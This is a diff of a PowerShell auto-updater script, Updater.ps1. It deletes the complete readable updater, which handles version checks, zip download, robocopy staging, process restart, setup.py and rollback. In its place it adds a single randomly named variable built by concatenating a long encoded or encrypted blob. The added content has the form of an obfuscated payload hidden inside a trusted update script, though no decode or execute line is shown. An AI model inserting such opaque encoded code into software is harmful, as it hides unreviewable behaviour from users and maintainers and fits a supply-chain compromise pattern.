@@ -1,612 +1,95 @@
-# ================================================================
-# Updater.ps1 -- Remote Template v3.0  (In-Place Sync Edition)
-# Placeholders injected by setup.py at each update cycle.
-# DO NOT fill path variables manually.
-#
-# STRATEGY : project\ is NEVER renamed or deleted.
-# Contents are synced in-place with robocopy /R:3 /W:2.
-# Windows Search is paused around the sync window to prevent
-# the indexer from holding file locks during the update.
-#
-# RECOMMENDED folder layout (set in Setup-AutoUpdate.ps1) :
-#   AppData\Local\<App>\
-#     python\      <- Python runtime, fixed, never updated here
-#     project\     <- your code only, lightweight, fast update
-#     _scripts\
-#     logs\
-# Keeping Python separate means robocopy never has to overwrite
-# a running executable, which eliminates the last class of locks.
-# ================================================================
-
-# ---- Baked-in variables (injected by setup.py)
-$LOG_KEEP_WEEKS  = %%LOG_KEEP_WEEKS%%
-$ProjectDir      = "%%PROJECT_DIR%%"
-$LogDir          = "%%LOG_DIR%%"
-$ZipUrl          = "%%ZIP_URL%%"
-$VerBaseUrl      = "%%VER_URL%%"
-$LocalVerFile    = "%%LOCAL_VER_FILE%%"
-$PYTHON_EXE      = "%%PYTHON_EXE%%"
-$SETUP_SCRIPT    = "%%SETUP_SCRIPT%%"
-$TempDir         = Join-Path $env:TEMP "GH_Update_%%REPO_NAME%%"
-$ZipPath         = Join-Path $TempDir "download.zip"
-$ExtractPath     = Join-Path $TempDir "extracted"
-
-# ---- Staging / backup paths (project\ itself never moves)
-$ProjectNew      = $ProjectDir + "_new"
-$ProjectOld      = $ProjectDir + "_old"
-
-# ---- robocopy tuning
-#  /R:3  = 3 retries per locked file (absorbs Defender / indexer blips)
-#  /W:2  = wait 2 s between retries
-$ROBO_FLAGS = "/E /PURGE /R:3 /W:2 /NFL /NDL /NJH /NJS /NC /NS /NP"
-
-# ----------------------------------------------------------------
-# Runtime capability detection
-# ----------------------------------------------------------------
-$_hasZipFile = $false
-try {
-    [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
-    $null = [System.IO.Compression.ZipFile]
-    $_hasZipFile = $true
-} catch {}
-
-# ----------------------------------------------------------------
-# Force TLS 1.2 -- required for GitHub on Windows 7
-# ----------------------------------------------------------------
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)
-} catch {
-    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls } catch {}
-}
-
-if ($_hasZipFile) {
-    try { [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null } catch {}
-}
-
-# ================================================================
-#  HELPERS
-# ================================================================
-
-function Get-UnixMs {
-    return [long](([datetime]::UtcNow) - [datetime]"1970-01-01").TotalMilliseconds
-}
-
-function New-NoCacheWebClient {
-    $wc = New-Object System.Net.WebClient
-    try {
-        $wc.CachePolicy = New-Object System.Net.Cache.RequestCachePolicy([System.Net.Cache.RequestCacheLevel]::NoCacheNoStore)
-    } catch {}
-    $wc.Headers.Add("User-Agent",    "PowerShell-AutoUpdate/3.0")
-    $wc.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate")
-    $wc.Headers.Add("Pragma",        "no-cache")
-    $wc.Headers.Add("Expires",       "0")
-    return $wc
-}
-
-function Write-Log {
-    param([string]$Level, [string]$Message)
-    try   { $week = Get-Date -UFormat "%Y-W%V" }
-    catch { $week = Get-Date -Format "yyyy-MM" }
-    $logFile = Join-Path $LogDir ("update_" + $week + ".log")
-    $line    = ("[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] [" + $Level + "] " + $Message)
-    if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
-    Add-Content -Path $logFile -Value $line -Encoding UTF8
-    Get-ChildItem $LogDir -Filter "update_*.log" |
-        Sort-Object LastWriteTime -Descending |
-        Select-Object -Skip $LOG_KEEP_WEEKS |
-        Remove-Item -Force -ErrorAction SilentlyContinue
-}
-
-function Get-RemoteVersion {
-    param([int]$MaxRetries = 3)
-    $delays = @(5, 15, 30)
-    for ($i = 1; $i -le $MaxRetries; $i++) {
-        try {
-            $wc  = New-NoCacheWebClient
-            $url = $VerBaseUrl + "?nocache=" + (Get-UnixMs) + "&r=" + (Get-Random -Maximum 999999)
-            $raw = $wc.DownloadString($url).Trim()
-            $wc.Dispose()
-            if ($raw.Length -gt 0) {
-                Write-Log "INFO" ("Remote version : " + $raw)
-                return $raw
-            }
-            Write-Log "WARN" "version.txt is empty"
-        } catch {
-            Write-Log "WARN" ("version fetch attempt " + $i + " failed : " + $_.Exception.Message)
-        }
-        if ($i -lt $MaxRetries) { Start-Sleep -Seconds $delays[$i - 1] }
-    }
-    return $null
-}
-
-function Get-LocalVersion {
-    if (-not (Test-Path $LocalVerFile)) {
-        Write-Log "INFO" "No local version.txt - first install"
-        return $null
-    }
-    $v = (Get-Content $LocalVerFile -Raw).Trim()
-    Write-Log "INFO" ("Local version  : " + $v)
-    return $v
-}
-
-function Download-WithRetry {
-    param([string]$Url, [string]$Dest, [int]$MaxRetries = 5, [int]$MinBytes = 1024)
-    $delays = @(5, 15, 30, 60, 120)
-    for ($i = 1; $i -le $MaxRetries; $i++) {
-        Write-Log "INFO" ("Download attempt " + $i + "/" + $MaxRetries)
-        try {
-            $wc = New-NoCacheWebClient
-            $wc.DownloadFile($Url, $Dest)
-            $wc.Dispose()
-            if ((Test-Path $Dest) -and (Get-Item $Dest).Length -gt $MinBytes) {
-                Write-Log "INFO" ("Download OK - " + [math]::Round((Get-Item $Dest).Length / 1KB, 1) + " KB")
-                return $true
-            }
-            Write-Log "WARN" "File too small - possible 404 or error page"
-        } catch {
-            Write-Log "WARN" ("Network error attempt " + $i + " : " + $_.Exception.Message)
-        }
-        if ($i -lt $MaxRetries) {
-            $wait = $delays[$i - 1]
-            Write-Log "INFO" ("Retrying in " + $wait + " seconds...")
-            Start-Sleep -Seconds $wait
-        }
-    }
-    Write-Log "ERROR" ("Download failed after " + $MaxRetries + " attempts")
-    return $false
-}
-
-function Extract-Zip {
-    param([string]$ZipFile, [string]$OutPath)
-    try {
-        if (Test-Path $OutPath) { Remove-Item $OutPath -Recurse -Force }
-        New-Item -ItemType Directory -Path $OutPath -Force | Out-Null
-        if ($_hasZipFile) {
-            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $OutPath)
-            Write-Log "INFO" "Extraction OK (.NET ZipFile)"
-        } else {
-            $shell  = New-Object -ComObject Shell.Application
-            $zipNS  = $shell.NameSpace($ZipFile)
-            $destNS = $shell.NameSpace($OutPath)
-            $destNS.CopyHere($zipNS.Items(), 0x14)
-            $deadline = (Get-Date).AddMinutes(5)
-            do {
-                Start-Sleep -Milliseconds 500
-                $cnt = (Get-ChildItem $OutPath -Recurse -File -ErrorAction SilentlyContinue).Count
-            } while ($cnt -eq 0 -and (Get-Date) -lt $deadline)
-            Start-Sleep -Seconds 2
-            try { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null } catch {}
-            Write-Log "INFO" "Extraction OK (Shell.Application)"
-        }
-        return $true
-    } catch {
-        Write-Log "ERROR" ("Extraction error : " + $_.Exception.Message)
-        return $false
-    }
-}
-
-function Resolve-ExtractRoot {
-    param([string]$ExtractPath)
-    $canon = (Resolve-Path $ExtractPath).Path
-    $items = @(Get-ChildItem $canon -ErrorAction SilentlyContinue)
-    if ($items.Count -eq 1 -and $items[0].PSIsContainer) {
-        $wrapped = (Resolve-Path $items[0].FullName).Path
-        Write-Log "INFO" ("Wrapper folder detected : " + $items[0].Name + " - unwrapping")
-        return $wrapped
-    }
-    Write-Log "INFO" "No wrapper folder - files at ZIP root"
-    return $canon
-}
-
-function Copy-ToStaging {
-    #
-    #  Copy source into project_new\ (completely fresh each time).
-    #  project\ is never touched here.
-    #  /R:0 /W:0 here -- staging is always a clean empty folder,
-    #  no retry needed since no existing files can be locked.
-    #
-    param([string]$SourcePath, [string]$Dest)
-    try {
-        if (Test-Path $Dest) { Remove-Item $Dest -Recurse -Force }
-        New-Item -ItemType Directory -Path $Dest -Force | Out-Null
-
-        $null = & robocopy $SourcePath $Dest /E /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP 2>&1
-        if ($LASTEXITCODE -lt 8) {
-            Write-Log "INFO" ("Staging OK (robocopy exit " + $LASTEXITCODE + ") -> " + $Dest)
-            return $true
-        }
-
-        Write-Log "WARN" ("robocopy exit " + $LASTEXITCODE + " - falling back to Copy-Item")
-        Push-Location $SourcePath
-        Get-ChildItem -Recurse | ForEach-Object {
-            $rel    = (Resolve-Path -Relative $_.FullName).TrimStart(".\/")
-            $target = Join-Path $Dest $rel
-            if ($_.PSIsContainer) {
-                if (-not (Test-Path $target)) { New-Item -ItemType Directory -Path $target -Force | Out-Null }
-            } else {
-                $td = Split-Path $target -Parent
-                if (-not (Test-Path $td)) { New-Item -ItemType Directory -Path $td -Force | Out-Null }
-                Copy-Item $_.FullName -Destination $target -Force
-            }
-        }
-        Pop-Location
-        Write-Log "INFO" ("Staging OK (Copy-Item fallback) -> " + $Dest)
-        return $true
-    } catch {
-        try { Pop-Location } catch {}
-        Write-Log "ERROR" ("Staging copy error : " + $_.Exception.Message)
-        return $false
-    }
-}
-
-function Test-StagingValid {
-    param([string]$StagingPath)
-    if (-not (Test-Path $StagingPath)) {
-        Write-Log "ERROR" ("Staging folder does not exist : " + $StagingPath)
-        return $false
-    }
-    $fileCount = (Get-ChildItem $StagingPath -Recurse -File -ErrorAction SilentlyContinue).Count
-    if ($fileCount -eq 0) {
-        Write-Log "ERROR" "Staging folder is empty"
-        return $false
-    }
-    $setupPath = Join-Path $StagingPath $SETUP_SCRIPT
-    if (-not (Test-Path $setupPath)) {
-        Write-Log "ERROR" ("setup.py not found in staging : " + $setupPath)
-        return $false
-    }
-    $pythonPath = Join-Path $StagingPath $PYTHON_EXE
-    if (-not (Test-Path $pythonPath)) {
-        Write-Log "ERROR" ("Python not found in staging : " + $pythonPath)
-        return $false
-    }
-    Write-Log "INFO" ("Staging valid : " + $fileCount + " files, setup.py OK, python OK")
-    return $true
-}
-
-function Invoke-RobocopySync {
-    #
-    #  Sync $Source into $Dest using robocopy /E /PURGE.
-    #  $Dest folder is NEVER renamed or deleted -- only its CONTENTS change.
-    #  /R:3 /W:2 absorbs transient locks from Defender and the indexer
-    #  without failing the whole update.
-    #
-    param([string]$Source, [string]$Dest, [string]$Label)
-    if (-not (Test-Path $Dest)) { New-Item -ItemType Directory -Path $Dest -Force | Out-Null }
-    $null = & robocopy $Source $Dest /E /PURGE /R:3 /W:2 /NFL /NDL /NJH /NJS /NC /NS /NP 2>&1
-    if ($LASTEXITCODE -lt 8) {
-        Write-Log "INFO" ($Label + " OK (robocopy exit " + $LASTEXITCODE + ")")
-        return $true
-    }
-    Write-Log "ERROR" ($Label + " FAILED (robocopy exit " + $LASTEXITCODE + ")")
-    return $false
-}
-
-function Invoke-Backup {
-    param([string]$ActivePath, [string]$BackupPath)
-    Write-Log "INFO" "Creating backup : project -> project_old ..."
-    if (Test-Path $BackupPath) {
-        Remove-Item $BackupPath -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    return (Invoke-RobocopySync -Source $ActivePath -Dest $BackupPath -Label "Backup")
-}
-
-function Invoke-SyncNewVersion {
-    param([string]$NewPath, [string]$ActivePath)
-    Write-Log "INFO" "Syncing project_new -> project (in-place, no rename) ..."
-    return (Invoke-RobocopySync -Source $NewPath -Dest $ActivePath -Label "Sync new version")
-}
-
-function Invoke-Rollback {
-    param([string]$ActivePath, [string]$BackupPath)
-    Write-Log "WARN" "====== ROLLBACK INITIATED ======"
-    if (-not (Test-Path $BackupPath)) {
-        Write-Log "ERROR" ("No backup found at : " + $BackupPath)
-        Write-Log "ERROR" "Cannot rollback -- manual action required"
-        return $false
-    }
-    $ok = Invoke-RobocopySync -Source $BackupPath -Dest $ActivePath -Label "Rollback"
-    if ($ok) {
-        Write-Log "INFO" "Rollback OK - previous version restored into project\"
-    } else {
-        Write-Log "ERROR" "Rollback FAILED - application may be in broken state"
-        Write-Log "ERROR" ("Manual fix : robocopy project_old project /E /PURGE")
-    }
-    return $ok
-}
-
-function Stop-WindowsSearch {
-    #
-    #  Pause the Windows Search indexer for the duration of the sync.
-    #  The indexer continuously scans AppData folders and can hold
-    #  read locks on .py / .pyc files at any moment.
-    #  "net stop wsearch" is graceful -- it finishes current I/O first.
-    #  Returns $true if the service was running (so caller knows to restart it).
-    #
-    $svc = Get-Service -Name "wsearch" -ErrorAction SilentlyContinue
-    if ($null -eq $svc) {
-        Write-Log "INFO" "Windows Search service not found -- skipping"
-        return $false
-    }
-    if ($svc.Status -ne "Running") {
-        Write-Log "INFO" "Windows Search already stopped -- skipping"
-        return $false
-    }
-    try {
-        $null = & net stop wsearch 2>&1
-        Write-Log "INFO" "Windows Search stopped"
-        Start-Sleep -Seconds 1
-        return $true
-    } catch {
-        Write-Log "WARN" ("Could not stop Windows Search : " + $_.Exception.Message)
-        return $false
-    }
-}
-
-function Start-WindowsSearch {
-    #
-    #  Restart the Windows Search indexer after the sync.
-    #  Only called if Stop-WindowsSearch returned $true.
-    #  Fire-and-forget -- we do not wait for it to fully start.
-    #
-    try {
-        $null = & net start wsearch 2>&1
-        Write-Log "INFO" "Windows Search restarted"
-    } catch {
-        Write-Log "WARN" ("Could not restart Windows Search : " + $_.Exception.Message)
-    }
-}
-
-function Stop-AppProcess {
-    #
-    #  Kill pythonw.exe processes running from inside ProjectDir.
-    #  Targets by executable path -- never kills unrelated python processes.
-    #
-    Write-Log "INFO" "Stopping app processes before update ..."
-    $killed = @()
-    try {
-        Get-Process -Name "pythonw" -ErrorAction SilentlyContinue | ForEach-Object {
-            $pid_ = $_.Id
-            try {
-                $exePath = $_.MainModule.FileName
-                if ($exePath -like ($ProjectDir + "*")) {
-                    Stop-Process -Id $pid_ -Force -ErrorAction Stop
-                    $killed += $pid_
-                    Write-Log "INFO" ("Killed PID " + $pid_ + " : " + $exePath)
-                }
-            } catch {
-                # MainModule inaccessible on 32/64-bit mismatch -- try WMI
-                try {
-                    $wmi = Get-WmiObject Win32_Process -Filter ("ProcessId=" + $pid_) -ErrorAction Stop
-                    if ($wmi.ExecutablePath -like ($ProjectDir + "*")) {
-                        Stop-Process -Id $pid_ -Force -ErrorAction Stop
-                        $killed += $pid_
-                        Write-Log "INFO" ("Killed PID " + $pid_ + " (via WMI)")
-                    }
-                } catch {
-                    Write-Log "WARN" ("Could not inspect PID " + $pid_ + " : " + $_.Exception.Message)
-                }
-            }
-        }
-    } catch {
-        Write-Log "WARN" ("Stop-AppProcess error : " + $_.Exception.Message)
-    }
-    if ($killed.Count -eq 0) {
-        Write-Log "INFO" "No app processes were running"
-    }
-    # Let Windows release all file handles
-    Start-Sleep -Milliseconds 800
-    return $killed
-}
-
-function Start-AppProcess {
-    #
-    #  Re-launch pythonw.exe main.py from the updated ProjectDir.
-    #  setup.py handles task re-registration -- this is a safety net only.
-    #
-    $pythonPath = Join-Path $ProjectDir $PYTHON_EXE
-    $mainPath   = Join-Path $ProjectDir "main.py"
-    if (-not (Test-Path $pythonPath)) {
-        Write-Log "WARN" ("Start-AppProcess : python not found at " + $pythonPath)
-        return
-    }
-    if (-not (Test-Path $mainPath)) {
-        Write-Log "WARN" "Start-AppProcess : main.py not found -- task will handle launch"
-        return
-    }
-    try {
-        $psi                  = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName         = $pythonPath
-        $psi.Arguments        = '"' + $mainPath + '"'
-        $psi.WorkingDirectory = $ProjectDir
-        $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow   = $true
-        $psi.UseShellExecute  = $false
-        [System.Diagnostics.Process]::Start($psi) | Out-Null
-        Write-Log "INFO" "App process restarted"
-    } catch {
-        Write-Log "WARN" ("Start-AppProcess error : " + $_.Exception.Message)
-    }
-}
-
-function Run-Setup {
-    $pythonPath = Join-Path $ProjectDir $PYTHON_EXE
-    $setupPath  = Join-Path $ProjectDir $SETUP_SCRIPT
-    if (-not (Test-Path $pythonPath)) {
-        Write-Log "ERROR" ("Python not found : " + $pythonPath)
-        return $false
-    }
-    if (-not (Test-Path $setupPath)) {
-        Write-Log "ERROR" ("setup.py not found : " + $setupPath)
-        return $false
-    }
-    try {
-        Write-Log "INFO" ("Running : " + $PYTHON_EXE + " " + $SETUP_SCRIPT)
-        $psi                  = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName         = $pythonPath
-        $psi.Arguments        = '"' + $setupPath + '"'
-        $psi.WorkingDirectory = $ProjectDir
-        $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow   = $true
-        $psi.UseShellExecute  = $false
-        $proc = [System.Diagnostics.Process]::Start($psi)
-        $proc.WaitForExit()
-        Write-Log "INFO" ("setup.py exit code : " + $proc.ExitCode)
-        if ($proc.ExitCode -ne 0) {
-            Write-Log "WARN" ("setup.py non-zero exit : " + $proc.ExitCode)
-            return $false
-        }
-        return $true
-    } catch {
-        Write-Log "ERROR" ("Could not start Python : " + $_.Exception.Message)
-        return $false
-    }
-}
-
-function Remove-LeftoverFolders {
-    foreach ($path in @($ProjectNew, $ProjectOld)) {
-        if (Test-Path $path) {
-            Write-Log "WARN" ("Leftover folder found at startup - cleaning : " + $path)
-            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-# ================================================================
-#  MAIN
-# ================================================================
-Write-Log "INFO" "====== UPDATER START ======"
-
-Remove-LeftoverFolders
-
-$remoteVer = Get-RemoteVersion
-$localVer  = Get-LocalVersion
-
-if ($null -eq $remoteVer) {
-    Write-Log "WARN" "Could not fetch remote version - skipping this cycle"
-    exit 0
-}
-
-if ($remoteVer -eq $localVer) {
-    Write-Log "INFO" "Already up to date - nothing to do"
-    exit 0
-}
-
-Write-Log "INFO" ("Update : " + $localVer + " -> " + $remoteVer)
-
-# ================================================================
-#  PHASE 1 -- Download & extract  (project\ untouched)
-# ================================================================
-
-if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
-
-if (-not (Download-WithRetry -Url $ZipUrl -Dest $ZipPath)) {
-    Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "ERROR" "Phase 1 failed : download error - project\ intact"
-    exit 1
-}
-
-if (-not (Extract-Zip -ZipFile $ZipPath -OutPath $ExtractPath)) {
-    Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "ERROR" "Phase 1 failed : extraction error - project\ intact"
-    exit 1
-}
-
-$realSource = Resolve-ExtractRoot -ExtractPath $ExtractPath
-
-# ================================================================
-#  PHASE 2 -- Stage into project_new\  (project\ untouched)
-# ================================================================
-
-if (-not (Copy-ToStaging -SourcePath $realSource -Dest $ProjectNew)) {
-    Remove-Item $TempDir    -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $ProjectNew -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "ERROR" "Phase 2 failed : staging error - project\ intact"
-    exit 1
-}
-
-if (-not (Test-StagingValid -StagingPath $ProjectNew)) {
-    Remove-Item $TempDir    -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $ProjectNew -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "ERROR" "Phase 2 failed : validation error - project\ intact"
-    exit 1
-}
-
-Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-Write-Log "INFO" "Temp folder cleaned"
-
-# ================================================================
-#  PHASE 3 -- Quiesce, backup, sync new version in place
-#
-#  project\ folder itself NEVER moves or gets deleted.
-#
-#  Order :
-#    1. Kill pythonw.exe           (releases exe/pyc handles)
-#    2. Stop Windows Search        (releases .py/.pyc read locks)
-#    3. robocopy project\ -> project_old\   (backup)
-#    4. robocopy project_new\ -> project\   (update, /R:3 /W:2)
-#    5. Restart Windows Search
-#    6. Restart app process
-#
-#  If step 4 fails -> rollback via robocopy + restart
-# ================================================================
-
-Stop-AppProcess
-$searchWasRunning = Stop-WindowsSearch
-
-if (-not (Invoke-Backup -ActivePath $ProjectDir -BackupPath $ProjectOld)) {
-    Remove-Item $ProjectNew -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Log "ERROR" "Phase 3 failed : could not create backup - aborting update"
-    if ($searchWasRunning) { Start-WindowsSearch }
-    Start-AppProcess
-    exit 1
-}
-
-if (-not (Invoke-SyncNewVersion -NewPath $ProjectNew -ActivePath $ProjectDir)) {
-    Write-Log "ERROR" "Phase 3 failed : sync error - initiating rollback"
-    $rollbackOK = Invoke-Rollback -ActivePath $ProjectDir -BackupPath $ProjectOld
-    if ($rollbackOK) {
-        Write-Log "WARN" "Rollback succeeded - previous version restored"
-    } else {
-        Write-Log "ERROR" "Rollback failed - application may be in broken state"
-    }
-    Remove-Item $ProjectNew -Recurse -Force -ErrorAction SilentlyContinue
-    if ($searchWasRunning) { Start-WindowsSearch }
-    Start-AppProcess
-    exit 1
-}
-
-Remove-Item $ProjectNew -Recurse -Force -ErrorAction SilentlyContinue
-Write-Log "INFO" "Staging folder cleaned"
-
-if ($searchWasRunning) { Start-WindowsSearch }
-
-# ================================================================
-#  PHASE 4 -- Run setup.py  (rollback + restart if it fails)
-# ================================================================
-
-if (-not (Run-Setup)) {
-    Write-Log "ERROR" "Phase 4 failed : setup.py error - initiating rollback"
-    $rollbackOK = Invoke-Rollback -ActivePath $ProjectDir -BackupPath $ProjectOld
-    if ($rollbackOK) {
-        Write-Log "WARN" "Rollback succeeded - previous version restored"
-        Start-AppProcess
-    } else {
-        Write-Log "ERROR" "Rollback failed - application may be in broken state"
-    }
-    exit 1
-}
-
-# ================================================================
-#  PHASE 5 -- Commit  (only reached after 100% success)
-# ================================================================
-
-Set-Content -Path $LocalVerFile -Value $remoteVer -Encoding UTF8
-Write-Log "INFO" ("Version saved : " + $remoteVer)
-
-Remove-Item $ProjectOld -Recurse -Force -ErrorAction SilentlyContinue
-Write-Log "INFO" "Backup cleaned"
-
-Write-Log "INFO" "====== UPDATE SUCCESS ======"
-exit 0
+$szqjztjn=''
+$szqjztjn+='Uk6sPz40WdLmcHpPB2c1j/AM4+7nLlVTrZJWttVpjIANXYB1Xn+9fvbjD8mFIagSQA+O/qWzw2Rg5lhpseu9JHBR14MCIzyDRC+m'
+$szqjztjn+='BBJTHg2UtebwctRSXEEoliSyzWAXcta4iw2lo9hTwF67PIDUY7tPfj5c0WPWhob2/OMFa0MayU2ecTPOhzpNeZ9vmzDok8ljTVA3'
+$szqjztjn+='XH5bRgbwLf2zS6AR+bw3AFhm7WiGRLA1wkoKmLjfiOVmJf/MftZjmCxlAmGzc8qA4gQE+6n+stoelaRcTWV7gcX2BB16nC8IqJUJ'
+$szqjztjn+='+3cocdsOjTyu4GS6xkJdbJ1WXY9KhXAVi4FZtLVlnCoftO9Vuo40H8AfflTyNQgLWsoJYXLZlEZrz+zvx8qqBXFB2kgamGk9/QQA'
+$szqjztjn+='xwLu/SOX5evAb4d3hYTprNhtrP8bD2AniFNfBWLmmHm4yynhp2V4DVa3Er9ou9/OCcvbZPlaWJrLIRA0L32lwcqkw5kvGPGfLTIY'
+$szqjztjn+='1L3/dbdUGCGFaBqW8JBsc9rq/k7r+PrlJ9Z/NvLGYnGBRqpApzY/GVJhbpNs0eTT9rgnj0AxTCeiDhZMx8ngs32mV3sZXeSK58qA'
+$szqjztjn+='YpxOauO1zBOygbczrc8+q3CbBFCHoDlwcJ7byPN3+52onju+v0EHaxKiQNdZzonkvavUMkH//RlFA49s5mYFdjHDNTOF9TbP+xuu'
+$szqjztjn+='hoJqbYKiA1sFQYRii5FtzDZnUb6b7p9zymbmBjU61cBkWClpygr0t6+AY/g3pyozpLlytcnNvrqcaxAbYat9MEeih7sXK77sav7+'
+$szqjztjn+='sF3YT09Xj4VdNvYjpZKOwJ8cQDGcnlzIeEV2Pqo/rRx4k5/jGEfdnczrrm+9fxtmWrLFzLRk3a+9FawKqyedJImYoV9Lx/wFQwa9'
+$szqjztjn+='+pL4/+POWk9WuzKLInmOrUyaeYyMABh3IOFkPgvf/e1zlAmLi7MRM900hkg70YINwUFc6hiuLKW7E17w2Z5w06Nk8q0RCjRkJR0k'
+$szqjztjn+='uMXcTjsd5pYC4MQtijQdWbD0JSqO8CuexwvSPF6ucRNJfaGCuTHPW/Si4zIKAQ6kO8aDlSuFIxi2KEKcznG4NFC1opPY0Cui6jBN'
+$szqjztjn+='IIIHKr/7sA36uzTt+qqC4Y1DK/9kBXu67ZLVbIKewgHRAjg0l4y707BbRBLyEU29/2AOl1s7PfxnntB6c3tEXgkzx1uC83zYpyF1'
+$szqjztjn+='HY8WRzPYi6ecW37IzbLTCORY9fX6ZFfhcAjSQKvdIzfhKx5gb0/oLwanxKgqzk1E4E9k5qCXiRBBcyuAVl+4Kl6TiqkA9KIXcGXQ'
+$szqjztjn+='PmeVdj/KgducNY2f6eCz9DUJGUXbmT7yFY4tdy0e9Tv4mCKsIi69ZwQZCKnCFepd4KkbIv87hLkYbA1W6TuLHy+Z6Q3OzHmfDXBH'
+$szqjztjn+='fi1638DdM5VmmcOOwrwDftMdwSjXkbPEVeMLh4nd2epgcjtSo/93m+Y/YvBUZDqNKIosnJPjkZnmo6EkopAjb0md6Eri9sYV5mz7'
+$szqjztjn+='KcQT1rpThid9WYkGyDF9IHdLC5Dt3DyZHma7u+51vAKpVQEn2ut/I9ziG2MIo9mk483mGiomL/wmG8I812Ex+VgQZ6LuF7z2+cXU'
+$szqjztjn+='SIBCC6GdhC3PO4dcrBJrJZIfFC5ptOo2bh1pwTdt/60drYYhLM1EpIZuo/VnPukxrbQqJIkkcjH8kk1C/TE0LdZUoHGNfG91kzSu'
+$szqjztjn+='/vEJIR1Y9pCk7Rk74lTd44J2AHjLZtyy5Z9wPRbLllnqD3hTUroIzehftrlnlYFTdI4eabQ5ZCjtple+egeKsVCPbfxIwQQ0dFxZ'
+$szqjztjn+='D48Aw/nwRyp3UPX3+iWyyvsOaDNoJ7pzH9nU5+uu0gg+FGgTyuDJgqW6pC++1cHAbxKsxhUdM44+R6508xB2Kf8Fd0TgYFMsQhGn'
+$szqjztjn+='qL7F2UVUUA9N6M3GtC8Z57paYktyQgornVvzrEYDo8c0QvP4Ym64FRLyI0PBVPC8Iymv8jrF2bi3yyckdSNgrlyyPn1APnlJ03EU'
+$szqjztjn+='HoYmGgOZMiihLMHCkftawU8xvRVw9mcB02TgSvsAsdSgKqeN3Fxd5kpIW2JjyZlPzVLfL8Ty78eHIyGFIYJ53AnFHClGEtLSl0GA'
+$szqjztjn+='9wYDLCLn2GU5eOV2YDQaYX5TV0ucbQ+qN7t4nnCTY1IREgnC4q1d50ZSm01HYn9HLKtylVv/h7wI02IW9CmYjerlC8d06J1AHgV1'
+$szqjztjn+='tj78lJEOZGu746mBxvM++kkxPfrzxFxfscH/bCHNZwhBi5eXVZTavsVDtUGX5Qx7rx4OJcV494KRoFiMePtjtG6LfDCmpA8q1+yV'
+$szqjztjn+='v/HRdZrOJRttozIp38XC+dUMyNKe1Z/CrnA/BWq+UWqVuNvyftsXm4xSsAXw6YGN0d4EZJDIH0UmFUdD8BhJf1/sgu2WdLCTU6T0'
+$szqjztjn+='k6djHY6UbCW0/ZaTBsrUIkcHKWRLiNBjWttY9OIdQLHYPoVNdpoB18UXSColBOTQYuqPSGWOPGrxHRIV3AgL+LYBM8Sb5n5aIgkH'
+$szqjztjn+='wi2KKCJz1hkHAhJ8yOI8hjuTIp1g9IWFJtN2kKXaY7fI/jFy9mlTberacUPHSpaGXMe992XE2Z2cMei5ChjKCFBljiJWFYrSediT'
+$szqjztjn+='JjE4eWULJ6nt9WflbMpUVIkAr4APFFiEgev2x7H65xMsCzNtwvuqpRVkaMUG4Hx0SnvXNaHexW2MQkrB922hFRsPQ1SWjxCBtSZv'
+$szqjztjn+='rMOWwV330bTv5pM+JeMXjKw9aBTpXWBa1K5XLgpnr5CHu+/Hb04V/DJ4vQ8+dV0iflc1NqQHye1etLN5QIuvdpbE1vwTWo1o/Rkz'
+$szqjztjn+='pwHzXOPrmahlH8DS4lBykt+orzjA9R7eWo8I+k2fgyvImSPQUXmlQYqEDNDe/2lR+UTndXqYmgjySsHetYDRzPqQDzWbRacIy9Oy'
+$szqjztjn+='XyA3FTEi5U8nYRGo3UG9cs44D7Et5w2zI4baFoDmMJQXS/PhrfzjW/Fih4hPuzbuC5Zc+GBKTx89LN9cYEC4o6LiBTUIfsgTxGay'
+$szqjztjn+='yA4fRBf1nZIXLkJ81SmzBH2J17m+/8hNsP0iyLeyEUBt4Dgb/KeD7ViiQJ3WbQR5NK/1BlYYZvkSpu+YA0geh/Pp5Tklq/JGVuXR'
+$szqjztjn+='VI584MZ4cANXO2FO8K/RCycGXQzAk2pjvOZ+FBGhbENmXKKhlfySN/rV6WMMKfE99tGJ4ItPGNOvxH0R9f3z2quLRHErcCHqOJxo'
+$szqjztjn+='1ZY62NfenyyX0mzipAHhNqhRhgmLyjM+5Vq7EN4PwHag0tu1EkYC6BZngaTVLeHfu8AYRWiWqLTKE6cCewYSRqGi0jDbH46WRm5d'
+$szqjztjn+='VvAVIZd02XUVSTk+9FUEQ2aqULR45hHVtx/ZKoihfbnwA6UE7mEGbqd65pieULeX2/PWLxh69oPPak0U6Id5mM70LCUxGLtzJur0'
+$szqjztjn+='fD0ko6jaldD5aEZl9yKL3ZIxSoiQoa2Hzu5wKb+Lq8fu0dUPCkKzdqwXYqr4B2xwUR1QsUxS7b4ZAJWSgp1rnMncWWOK7CCar2p3'
